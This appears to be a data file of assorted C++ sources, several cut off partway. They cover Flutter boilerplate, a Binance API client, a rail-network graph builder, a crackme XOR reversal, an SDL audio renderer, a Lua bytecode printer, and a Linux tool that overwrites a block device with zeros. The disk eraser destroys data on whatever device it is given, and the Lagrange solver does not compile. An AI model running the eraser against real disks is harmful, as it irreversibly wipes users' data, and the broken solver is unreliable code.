    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"regue_a_plantinha\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include<string>\r\n#include<vector>\r\n#include \"json.hpp\"\r\n#include<cmath>\r\nusing namespace std;\r\nlong long decodeValue(const string& value,int base){\r\n    long long res=0;\r\n    for(char c:value){\r\n        int digit=(c>='0' && c<='9')? c-'0':c-'A'+10;\r\n        res=res*base+digit;\r\n    }\r\n    return res;\r\n}\r\ndouble lagrange(const vextor<pair<int,double>>& points){\r\n    double constant=0.0;\r\n    int n=points.size();\r\n    for(int i=0;i<n;i++){\r\n        double term=points[i].second;\r\n        for(int j=0;j<n;j++){\r\n            if(i!=j){\r\n                term*=(0.0-points[j].first)/(points[i].first-points[j].first);\r\n            }\r\n        }\r\n        constant+=term;\r\n    }\r\n    return constant;\r\n}\r\nint main(){\r\n    ifstream file(\"input.json\");\r\n    if(!file.is_open()){\r\n        cerr<<\"ERROR IN OPENING FILE\"<<endl;\r\n        return 1;\r\n    }\r\n    Json::Value root;\r\n    file>>root;\r\n    int n=root[\"keys\"][\"n\"].asInt();\r\n    int k=root[\"keys\"][\"k\"].asInt();\r\n    vector<pair<int,double>> points;\r\n    for(int i=1;i<=n;i++){\r\n        string x_str=to_string(i);\r\n        int x=i;\r\n        int base=stoi(root[x_str][\"base\"].asString());\r\n        string value=root[x_str][\"value\"].asString();\r\n        double y=decodeValue(value,base);\r\n        points.emplace_back(x,y);\r\n    }\r\n    double constant=lagrange(points);\r\n    cout<<\"Constant term(c): \"<<constant<<endl;\r\n    return 0;\r\n}",
    "/**\r\nBinance HTTPS Session\r\n\r\nLicensed under the MIT License <http://opensource.org/licenses/MIT>.\r\nSPDX-License-Identifier: MIT\r\nCopyright (c) 2022 Vitezslav Kot <vitezslav.kot@gmail.com>.\r\n*/\r\n\r\n#include \"vk/binance/binance_http_session.h\"\r\n#include \"vk/utils/utils.h\"\r\n#include <boost/asio/ssl.hpp>\r\n#include <boost/beast/version.hpp>\r\n#include <spdlog/spdlog.h>\r\n#include <openssl/hmac.h>\r\n\r\nnamespace vk::binance {\r\nnamespace ssl = boost::asio::ssl;\r\nusing tcp = net::ip::tcp;\r\n\r\nauto API_SPOT_URI = \"api.binance.com\";\r\nauto API_FUTURES_URI = \"fapi.binance.com\";\r\n\r\nauto PRIVATE_API_SPOT = \"/api/v3/\";\r\nauto PUBLIC_API_SPOT = \"/api/v1/\";\r\n\r\nauto PRIVATE_API_FUTURES = \"/fapi/v1/\";\r\nauto PUBLIC_API_FUTURES = \"/fapi/v1/\";\r\n\r\nauto PRIVATE_API_FUTURES_V2 = \"/fapi/v2/\";\r\nauto PUBLIC_API_FUTURES_V2 = \"/fapi/v2/\";\r\n\r\nstruct HTTPSession::P {\r\n    net::io_context m_ioc;\r\n    std::string m_apiKey;\r\n    std::string m_apiSecret;\r\n    std::string m_uri;\r\n    std::string m_publicApi;\r\n    std::string m_privateApi;\r\n    std::string m_publicApiV2;\r\n    std::string m_privateApiV2;\r\n    std::atomic<std::int32_t> m_usedWeight = 0;\r\n    std::atomic<std::tm> m_lastResponseTime{};\r\n    std::int32_t m_weightLimit{};\r\n    const EVP_MD *m_evp_md;\r\n\r\n    P() : m_evp_md(EVP_sha256()) {\r\n    }\r\n\r\n    http::response<http::string_body> request(http::request<http::string_body> req);\r\n\r\n    void addTimestampToTargetPath(std::string &target) const;\r\n};\r\n\r\nHTTPSession::HTTPSession(const std::string &apiKey, const std::string &apiSecret, const bool futures) : m_p(\r\n    std::make_unique<P>()) {\r\n    if (futures) {\r\n        m_p->m_uri = API_FUTURES_URI;\r\n        m_p->m_publicApi = PUBLIC_API_FUTURES;\r\n        m_p->m_privateApi = PRIVATE_API_FUTURES;\r\n        m_p->m_publicApiV2 = PUBLIC_API_FUTURES_V2;\r\n        m_p->m_privateApiV2 = PRIVATE_API_FUTURES_V2;\r\n    } else {\r\n        m_p->m_uri = API_SPOT_URI;\r\n        m_p->m_publicApi = PUBLIC_API_SPOT;\r\n        m_p->m_privateApi = PRIVATE_API_SPOT;\r\n        m_p->m_publicApiV2 = PUBLIC_API_SPOT;\r\n        m_p->m_privateApiV2 = PRIVATE_API_SPOT;\r\n    }\r\n\r\n    m_p->m_apiKey = apiKey;\r\n    m_p->m_apiSecret = apiSecret;\r\n\r\n    /// 2400 is the default value according to https://binance-docs.github.io/apidocs/futures/en/#limits\r\n    m_p->m_weightLimit = 2400 * 0.95;\r\n    spdlog::info(fmt::format(\"API Weight limit: {}\", m_p->m_weightLimit));\r\n}\r\n\r\nHTTPSession::~HTTPSession() = default;\r\n\r\nhttp::response<http::string_body> HTTPSession::get(const std::string &target, const bool isPublic) const {\r\n    std::string finalTarget = target;\r\n\r\n    if (!isPublic) {\r\n        m_p->addTimestampToTargetPath(finalTarget);\r\n    }\r\n\r\n    std::string endpoint;\r\n\r\n    if (isPublic) {\r\n        endpoint = m_p->m_publicApi + finalTarget;\r\n    } else {\r\n        endpoint = m_p->m_privateApi + finalTarget;\r\n    }\r\n\r\n    const http::request<http::string_body> req{http::verb::get, endpoint, 11};\r\n    return m_p->request(req);\r\n}\r\n\r\nhttp::response<http::string_body> HTTPSession::getV2(const std::string &target, const bool isPublic) const {\r\n    std::string finalTarget = target;\r\n\r\n    if (!isPublic) {\r\n        m_p->addTimestampToTargetPath(finalTarget);\r\n    }\r\n\r\n    std::string endpoint;\r\n\r\n    if (isPublic) {\r\n        endpoint = m_p->m_publicApiV2 + finalTarget;\r\n    } else {\r\n        endpoint = m_p->m_privateApiV2 + finalTarget;\r\n    }\r\n\r\n    const http::request<http::string_body> req{http::verb::get, endpoint, 11};\r\n    return m_p->request(req);\r\n}\r\n\r\nhttp::response<http::string_body> HTTPSession::getFutures(const std::string &target) const {\r\n    const http::request<http::string_body> req{http::verb::get, target, 11};\r\n    return m_p->request(req);\r\n}\r\n\r\nhttp::response<http::string_body>\r\nHTTPSession::post(const std::string &target, const std::string &payload, const bool isPublic) const {\r\n    std::string finalTarget = target;\r\n\r\n    if (!isPublic) {\r\n        m_p->addTimestampToTargetPath(finalTarget);\r\n    }\r\n\r\n    std::string endpoint;\r\n\r\n    if (isPublic) {\r\n        endpoint = m_p->m_publicApi + finalTarget;\r\n    } else {\r\n        endpoint = m_p->m_privateApi + finalTarget;\r\n    }\r\n\r\n    http::request<http::string_body> req{http::verb::post, endpoint, 11};\r\n    req.body() = payload;\r\n    req.prepare_payload();\r\n    return m_p->request(req);\r\n}\r\n\r\nhttp::response<http::string_body>\r\nHTTPSession::put(const std::string &target, const std::string &payload, const bool isPublic) const {\r\n    std::string finalTarget = target;\r\n\r\n    if (!isPublic) {\r\n        m_p->addTimestampToTargetPath(finalTarget);\r\n    }\r\n\r\n    std::string endpoint;\r\n\r\n    if (isPublic) {\r\n        endpoint = m_p->m_publicApi + finalTarget;\r\n    } else {\r\n        endpoint = m_p->m_privateApi + finalTarget;\r\n    }\r\n\r\n    http::request<http::string_body> req{http::verb::put, endpoint, 11};\r\n    req.body() = payload;\r\n    req.prepare_payload();\r\n    return m_p->request(req);\r\n}\r\n\r\nhttp::response<http::string_body> HTTPSession::del(const std::string &target, const bool is",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <cmath>\n#include <deque>\n\n#include \"unroll.h\"\n#include \"pathsearch.h\"\n\nusing namespace std;\n\n\n\n\n\n\n\n\n////////////////////////////////////////////////////////////////////////////////\nvoid recursive_unroll(\n    const TrainRequest& request,\n    const TimePos& sink,\n    const Graph<string, int>& path,\n    const DurationTable& durations,\n    const unordered_map<string, int>& windows,\n    Graph<TimePos, float>& network,\n    vector<const Node<TimePos, float>*>& ordering,\n    deque<const Node<TimePos, float>*>& actives) \n{\n    //  nothing to do if there is no node left\n    if (actives.empty())\n        return;\n\n    //  get first active node\n    const Node<TimePos, float>* currNode = actives.front();\n    actives.pop_front();\n\n    //  dead node if time limit is reached\n    const TimePos& currTimePos = currNode->label();\n    const string& currStation = currTimePos.position_;\n    const int currWindow = windows.at(currStation);\n\n    if (currTimePos.time_ > currWindow)\n        return;\n\n    //  remember node order\n    ordering.push_back(currNode);\n\n    //  when reached destination, add free edge to sink and return\n    if (currStation == request.to) {\n        network.addEdge(currTimePos, sink);\n        return;\n    }\n\n    //  should stop if next station is destination or requested\n    //    assumes existence of currStation key\n    const string& nextStation = path.node(currStation)->firstLabelTo();\n\n    bool stopRequested = (   \n        (request.to == nextStation) || \n        (find(   // O(n) time\n            request.intermediate_stops.begin(),\n            request.intermediate_stops.end(),\n            nextStation\n        ) != request.intermediate_stops.end())\n    );\n\n    //  wait (don't wait in first layer. it is constructed according to profit beforehand)\n    if (currStation != request.from && \n        currTimePos.state_ == TimePos::State::Stopped) \n    {\n        const int t = currTimePos.time_ + TIME_STEP;\n\n        if (t <= currWindow)\n        {\n            TimePos nextStay(TimePos::State::Stopped, t, currStation, 0);\n            bool existed = network.hasNode(nextStay);\n            const auto nextNode = network.addNode(nextStay);\n            network.addEdge(currTimePos, nextStay); // COST!!\n\n            if (!existed) \n                actives.push_front(nextNode);\n        }\n    }\n\n    //  get duration table\n    //  NOTE:\n    //    segfault if nextStation (or currStation for that matter) is empty \n    //    string, which is prevented by earlier \n    //      currStation == request.to \n    //    exit\n    const auto& currDurations = durations.at(currStation).at(nextStation);\n\n    //  *-stop\n    if (currTimePos.state_ == TimePos::State::Fullspeed ||\n        currTimePos.state_ == TimePos::State::Stopped) \n    {\n        int t = currTimePos.time_;\n\n        //  full-stop\n        if (currTimePos.state_ == TimePos::State::Fullspeed)\n            t += currDurations.at(BlockType::FullStop);\n        //  stop-stop\n        else \n            t += currDurations.at(BlockType::StopStop);\n        \n        t = nextStep(t, TIME_STEP);\n        const float nextWindow = windows.at(nextStation);\n\n        if (t <= nextWindow)\n        {\n            TimePos nextFullStop(TimePos::State::Stopped, t, nextStation, 0);\n            bool existed = network.hasNode(nextFullStop);\n            const auto nextNode = network.addNode(nextFullStop);\n            network.addEdge(currTimePos, nextFullStop); // cost!!\n\n            if (!existed) \n                actives.push_back(nextNode);\n        }\n    }\n\n    //  *-full\n    //  only applicable if no stop is requested\n    if (!stopRequested)\n    {\n        if (currTimePos.state_ == TimePos::State::Stopped ||\n            currTimePos.state_ == TimePos::State::Fullspeed) \n        {\n            int t = currTimePos.time_;\n\n            //  full-full\n            if (currTimePos.state_ == TimePos::State::Fullspeed)\n                t += currDurations.at(BlockType::FullFull);\n            //  stop-full\n            else\n                t += currDurations.at(BlockType::StopFull);\n\n            t = nextStep(t, TIME_STEP);\n            const float nextWindow = windows.at(nextStation);\n\n            if (t <= nextWindow)\n            {    \n                TimePos nextStopFull(TimePos::State::Fullspeed, t, nextStation, 0);\n                bool existed = network.hasNode(nextStopFull);\n                const auto nextNode = network.addNode(nextStopFull);\n                network.addEdge(currTimePos, nextStopFull); // cost!!\n        \n                if (!existed)\n                    actives.push_back(nextNode);\n            }\n        }\n    }\n}\n\n\n////////////////////////////////////////////////////////////////////////////////\nvoid unroll(\n    const TrainRequest& request,\n    const Graph<string, int>& track,\n    const StationTable& stations,\n    const DurationTable& durations,\n    Graph<TimePos, float>& network,\n    vector<const Node<TimePos, float>*>& ordering) \n{\n    //  find path from",
    "#include <iostream>\n#include <vector>\n#include <iomanip>\n#include <cstdint>\n\nint main() {\n    // The known final sorted and transformed result (expected 17-byte answer)\n    std::vector<uint8_t> hexValues = {\n        0x58, 0x58, 0x5B, 0x5B, 0x5A, 0x5A, 0x5F, 0x5F,\n        0x51, 0x5E, 0x5E, 0x51, 0x50, 0x50, 0x55, 0x54,\n        0x54, 0x57, 0x49, 0x4C, 0x4B, 0x4D, 0x4D, 0x43,\n        0x4F, 0x4F, 0x40, 0x48, 0x43\n    };\n\n    std::swap(hexValues[19], hexValues[27]);\n    std::swap(hexValues[23], hexValues[27]);\n\n    // Step 1: Reverse the second XOR transformation\n    for (size_t i = 0; i < hexValues.size(); i++) {\n        hexValues[i] ^= 0x39;\n    }\n    std::swap(hexValues[8], hexValues[10]);\n\n\n\n    // Output the resulting array, which is the sorted original input\n    std::cout << \"Sorted original input (after reversing XOR transformations): \";\n    for (const auto &val : hexValues) {\n        //std::cout << std::hex << std::uppercase << std::setfill('0') << std::setw(2) << (int)val << \" \";\n        std::cout << (char)val;\n    }\n    std::cout << std::endl;\n\n    return 0;\n}\n\n/*\npython -c 'import sys; sys.stdout.buffer.write(b\"\\x61\\x62\\x63\\x63\\x64\\x68\\x69\\x6B\\x6E\\x70\\x70\\x72\\x72\\x73\\x73\\x74\\x77\")'\n\n\n*/",
    "#include <iostream>\n#include <fstream>\n#include <chrono>\n#include <cstring>\n#include <csignal>\n#include <thread>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <linux/fs.h>\n\nvolatile bool keep_running = true;\n\n// Obs\u0142uga sygna\u0142u Ctrl+C\nvoid handle_signal(int signal) {\n    if (signal == SIGINT) {\n        keep_running = false;\n        std::cout << \"\\nProcess interrupted by user. Exiting...\" << std::endl;\n    }\n}\n\n// Pobieranie modelu i producenta dysku\nstd::string get_disk_info(const std::string& device) {\n    std::string model, vendor;\n    std::ifstream vendor_file(\"/sys/block/\" + device.substr(5) + \"/device/vendor\");\n    std::ifstream model_file(\"/sys/block/\" + device.substr(5) + \"/device/model\");\n\n    if (vendor_file) {\n        std::getline(vendor_file, vendor);\n    }\n    if (model_file) {\n        std::getline(model_file, model);\n    }\n\n    return vendor + \" \" + model;\n}\n\n// Pobieranie rodzaju dysku (SATA, NVMe, USB)\nstd::string get_disk_type(const std::string& device) {\n    if (device.find(\"nvme\") != std::string::npos) return \"NVMe\";\n    if (device.find(\"sd\") != std::string::npos) return \"SATA/USB\";\n    return \"Unknown\";\n}\n\n// Odliczanie przed startem\nvoid countdown() {\n    for (int i = 5; i > 0; --i) {\n        if (!keep_running) return;\n        std::cout << \"\\rStarting in \" << i << \"... \";\n        std::cout.flush();\n        sleep(1);\n    }\n    std::cout << \"Start!\" << std::endl;\n}\n\n// Wy\u015bwietlanie progresu\nvoid print_progress(double percentage, double speed) {\n    std::cout << \"\\rProgress: \" << percentage << \"% | Speed: \" << speed << \" MB/s\";\n    std::cout.flush();\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 4) {\n        std::cerr << \"Usage: \" << argv[0] << \" <device> <erase_size_MB> <skip_size_MB>\" << std::endl;\n        return 1;\n    }\n\n    const char* device = argv[1];\n    size_t erase_size = std::stoul(argv[2]) * 1024 * 1024; // MB -> bytes\n    size_t skip_size = std::stoul(argv[3]) * 1024 * 1024;  // MB -> bytes\n\n    signal(SIGINT, handle_signal); // Obs\u0142uga Ctrl+C\n\n    int fd = open(device, O_WRONLY);\n    if (fd < 0) {\n        perror(\"Error opening device\");\n        return 1;\n    }\n\n    // Pobranie rozmiaru dysku\n    unsigned long long device_size = 0;\n    if (ioctl(fd, BLKGETSIZE64, &device_size) < 0) {\n        perror(\"Error getting device size\");\n        close(fd);\n        return 1;\n    }\n\n    // Pobranie informacji o dysku\n    std::string disk_info = get_disk_info(device);\n    std::string disk_type = get_disk_type(device);\n\n    // Wy\u015bwietlenie informacji\n    std::cout << \"Device: \" << device << std::endl;\n    std::cout << \"Size: \" << device_size / (1024 * 1024) << \" MB\" << std::endl;\n    std::cout << \"Type: \" << disk_type << std::endl;\n    std::cout << \"Model: \" << disk_info << std::endl;\n\n    // Odliczanie przed startem\n    countdown();\n    if (!keep_running) {\n        close(fd);\n        return 0;\n    }\n\n    // Bufor do kasowania\n    char* buffer = new char[erase_size];\n    memset(buffer, 0, erase_size);\n\n    size_t total_erased = 0;\n    auto start_time = std::chrono::high_resolution_clock::now();\n\n    for (unsigned long long offset = 0; offset < device_size && keep_running; offset += (erase_size + skip_size)) {\n        if (lseek(fd, offset, SEEK_SET) < 0) {\n            perror(\"Error seeking device\");\n            delete[] buffer;\n            close(fd);\n            return 1;\n        }\n\n        if (write(fd, buffer, erase_size) < 0) {\n            perror(\"Error writing to device\");\n            delete[] buffer;\n            close(fd);\n            return 1;\n        }\n\n        total_erased += erase_size;\n\n        auto current_time = std::chrono::high_resolution_clock::now();\n        std::chrono::duration<double> elapsed = current_time - start_time;\n        double percentage = (double)total_erased / device_size * 100.0;\n        double speed = (total_erased / (1024.0 * 1024.0)) / elapsed.count();\n\n        print_progress(percentage, speed);\n    }\n\n    auto end_time = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> total_time = end_time - start_time;\n    double avg_speed = (total_erased / (1024.0 * 1024.0)) / total_time.count();\n\n    if (keep_running) {\n        std::cout << \"\\nErasure completed successfully.\" << std::endl;\n    } else {\n        std::cout << \"\\nErasure interrupted by user.\" << std::endl;\n    }\n\n    std::cout << \"Total time: \" << total_time.count() << \" seconds\" << std::endl;\n    std::cout << \"Average speed: \" << avg_speed << \" MB/s\" << std::endl;\n\n    delete[] buffer;\n    close(fd);\n    return 0;\n}\n\n",
    "#include \"sdl.h\"\n\n#include <Limelight.h>\n#include <SDL.h>\n\nSdlAudioRenderer::SdlAudioRenderer()\n    : m_AudioDevice(0),\n      m_AudioBuffer(nullptr)\n{\n    SDL_assert(!SDL_WasInit(SDL_INIT_AUDIO));\n\n    if (SDL_InitSubSystem(SDL_INIT_AUDIO) != 0) {\n        SDL_LogError(SDL_LOG_CATEGORY_APPLICATION,\n                     \"SDL_InitSubSystem(SDL_INIT_AUDIO) failed: %s\",\n                     SDL_GetError());\n        SDL_assert(SDL_WasInit(SDL_INIT_AUDIO));\n    }\n}\n\nbool SdlAudioRenderer::prepareForPlayback(const OPUS_MULTISTREAM_CONFIGURATION* opusConfig)\n{\n    SDL_AudioSpec want, have;\n\n    SDL_zero(want);\n    want.freq = opusConfig->sampleRate;\n    want.format = AUDIO_S16;\n    want.channels = opusConfig->channelCount;\n\n    // On PulseAudio systems, setting a value too small can cause underruns for other\n    // applications sharing this output device. We impose a floor of 480 samples (10 ms)\n    // to mitigate this issue. Otherwise, we will buffer up to 3 frames of audio which\n    // is 15 ms at regular 5 ms frames and 30 ms at 10 ms frames for slow connections.\n    // The buffering helps avoid audio underruns due to network jitter.\n//#ifndef Q_OS_DARWIN\n#if !defined(__APPLE__) || !defined(__MACH__)\n    want.samples = SDL_max(480, opusConfig->samplesPerFrame * 3);\n#else\n    // HACK: Changing the buffer size can lead to Bluetooth HFP\n    // audio issues on macOS, so we're leaving this alone.\n    // https://github.com/moonlight-stream/moonlight-qt/issues/1071\n    want.samples = SDL_max(480, opusConfig->samplesPerFrame);\n#endif\n\n    m_FrameSize = opusConfig->samplesPerFrame * sizeof(short) * opusConfig->channelCount;\n\n    m_AudioDevice = SDL_OpenAudioDevice(NULL, 0, &want, &have, 0);\n    if (m_AudioDevice == 0) {\n        SDL_LogError(SDL_LOG_CATEGORY_APPLICATION,\n                     \"Failed to open audio device: %s\",\n                     SDL_GetError());\n        return false;\n    }\n\n    m_AudioBuffer = SDL_malloc(m_FrameSize);\n    if (m_AudioBuffer == nullptr) {\n        SDL_LogError(SDL_LOG_CATEGORY_APPLICATION,\n                     \"Failed to allocate audio buffer\");\n        return false;\n    }\n\n    SDL_LogInfo(SDL_LOG_CATEGORY_APPLICATION,\n                \"Desired audio buffer: %u samples (%u bytes)\",\n                want.samples,\n                want.samples * (Uint32)sizeof(short) * want.channels);\n\n    SDL_LogInfo(SDL_LOG_CATEGORY_APPLICATION,\n                \"Obtained audio buffer: %u samples (%u bytes)\",\n                have.samples,\n                have.size);\n\n    SDL_LogInfo(SDL_LOG_CATEGORY_APPLICATION,\n                \"SDL audio driver: %s\",\n                SDL_GetCurrentAudioDriver());\n\n    // Start playback\n    SDL_PauseAudioDevice(m_AudioDevice, 0);\n\n    return true;\n}\n\nSdlAudioRenderer::~SdlAudioRenderer()\n{\n    if (m_AudioDevice != 0) {\n        // Stop playback\n        SDL_PauseAudioDevice(m_AudioDevice, 1);\n        SDL_CloseAudioDevice(m_AudioDevice);\n    }\n\n    if (m_AudioBuffer != nullptr) {\n        SDL_free(m_AudioBuffer);\n    }\n\n    SDL_QuitSubSystem(SDL_INIT_AUDIO);\n    SDL_assert(!SDL_WasInit(SDL_INIT_AUDIO));\n}\n\nvoid* SdlAudioRenderer::getAudioBuffer(int*)\n{\n    return m_AudioBuffer;\n}\n\nbool SdlAudioRenderer::submitAudio(int bytesWritten)\n{\n    if (bytesWritten == 0) {\n        // Nothing to do\n        return true;\n    }\n\n    // Don't queue if there's already more than 30 ms of audio data waiting\n    // in Moonlight's audio queue.\n    if (LiGetPendingAudioDuration() > 30) {\n        return true;\n    }\n\n    // Provide backpressure on the queue to ensure too many frames don't build up\n    // in SDL's audio queue, but don't wait forever to avoid a deadlock if the\n    // audio device fails.\n    for (int i = 0; i < 100; i++) {\n        // Our device may enter a permanent error status upon removal, so we need\n        // to recreate the audio device to pick up the new default audio device.\n        if (SDL_GetAudioDeviceStatus(m_AudioDevice) == SDL_AUDIO_STOPPED) {\n            return false;\n        }\n\n        // Only queue more samples where there are 10 frames or less in SDL's queue\n        if (SDL_GetQueuedAudioSize(m_AudioDevice) / m_FrameSize <= 10) {\n            break;\n        }\n\n        SDL_Delay(1);\n    }\n\n    if (SDL_QueueAudio(m_AudioDevice, m_AudioBuffer, bytesWritten) < 0) {\n        SDL_LogError(SDL_LOG_CATEGORY_APPLICATION,\n                     \"Failed to queue audio sample: %s\",\n                     SDL_GetError());\n    }\n\n    return true;\n}\n\nint SdlAudioRenderer::getCapabilities()\n{\n    // Direct submit can't be used because we use LiGetPendingAudioDuration()\n    return CAPABILITY_SUPPORTS_ARBITRARY_AUDIO_DURATION;\n}\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  unsigned int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <unordered_set>\n#include <random>\n\nusing namespace std;\n\nconst int TOTAL_NODES = 23947347;\nconst int NUM_TESTS = 101;\nconst string OUTPUT_FILE = \"test_cases.csv\";\n\n// Custom hash function for unordered_set with pairs\nstruct PairHash {\n    template <typename T1, typename T2>\n    size_t operator()(const pair<T1, T2> &p) const {\n        return hash<T1>()(p.first) ^ (hash<T2>()(p.second) << 1);\n    }\n};\n\nint main() {\n    // Use random device to generate random numbers\n    random_device rd;\n    mt19937 gen(rd());\n    uniform_int_distribution<int> dist(1, TOTAL_NODES);\n\n    unordered_set<pair<int, int>, PairHash> usedPairs;\n    ofstream file(OUTPUT_FILE);\n\n    if (!file.is_open()) {\n        cerr << \"Error: Cannot open output file!\\n\";\n        return 1;\n    }\n\n    file << \"Test ID, Source, Destination\\n\";\n\n    for (int i = 1; i < NUM_TESTS; ++i) {\n        int source, destination;\n        do {\n            source = dist(gen);\n            destination = dist(gen);\n        } while (source == destination || usedPairs.count({source, destination}));\n\n        usedPairs.insert({source, destination});\n        // | AL_019_01 | 1         | 2           | 2               | [AL_019_01](./testing/testingResuts/AL_019_01) |\n        // file << \"| AL_019_\" << i << \"|\" << source << \"|\" << destination << \"||[AL_019_\" << i << \"](./testing/testingResuts/AL_019_\" << i << \")|\" << \"\\n\";\n        // | **AL_019_01** |||||\n        // file << \"| **AL_019_\" << i << \"** |||||\" << \"\\n\";\n        file << \"AL_019_\" << i << \",\" << source << \",\" << destination << \"\\n\";\n    }\n\n    file.close();\n    cout << \"Generated \" << NUM_TESTS << \" test cases in \" << OUTPUT_FILE << \"\\n\";\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"myapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n*\n* Date: 1-1-2025\n* Author: Jeremiah J.\n* File: PrettyPrint.cpp\n* Description: Handles printing everything beautifully.\n*\n*/\n#include \"PrettyPrint.hpp\"\n\nvoid PrintHeader(const Deserializer::Header& header) {\n    std::cout << \"-- Header Info --\" << std::endl;\n    std::cout << \"Signature: '\" << header.Signature << \"'\" << std::endl;\n    std::cout << \"Version: \" << (int)header.Version << std::endl;\n    std::cout << \"Format: \" << (int)header.Format << std::endl;\n    std::cout << \"Endianness: \" << (header.Endianness == 0 ? \"Big Endian\" : \"Little Endian\") << std::endl;\n    std::cout << \"Int Size: \" << (int)header.IntSize << std::endl;\n    std::cout << \"Size_t Size: \" << (int)header.Size_tSize << std::endl;\n    std::cout << \"Instruction Size: \" << (int)header.InstructionSize << std::endl;\n    std::cout << \"Lua Number Size: \" << (int)header.LuaNumberSize << std::endl;\n    std::cout << \"Integral Flag: \" << (int)header.IntegralFlag << std::endl;\n}\n\nvoid PrintPrototype(const Deserializer::Prototype& proto, int level, const std::string& funcName) {\n    std::string indent(level * 4, ' ');\n    std::cout << indent << \"function \" << funcName << \"(...)\" << std::endl;\n\n    std::cout << indent << \"    -- Prototype Info --\" << std::endl;\n    std::cout << indent << \"    Source = '\" << (proto.Source.empty() ? \"(none)\" : proto.Source) << \"'\" << std::endl;\n    std::cout << indent << \"    LineDefined = \" << proto.LineDefined << std::endl;\n    std::cout << indent << \"    LastLineDefined = \" << proto.LastLineDefined << std::endl;\n    std::cout << indent << \"    NumUpvalues = \" << (int)proto.NumUpvalues << std::endl;\n    std::cout << indent << \"    NumParameters = \" << (int)proto.NumParameters << std::endl;\n    std::cout << indent << \"    IsVararg = \" << (proto.IsVararg ? \"true\" : \"false\") << std::endl;\n    std::cout << indent << \"    MaxStackSize = \" << 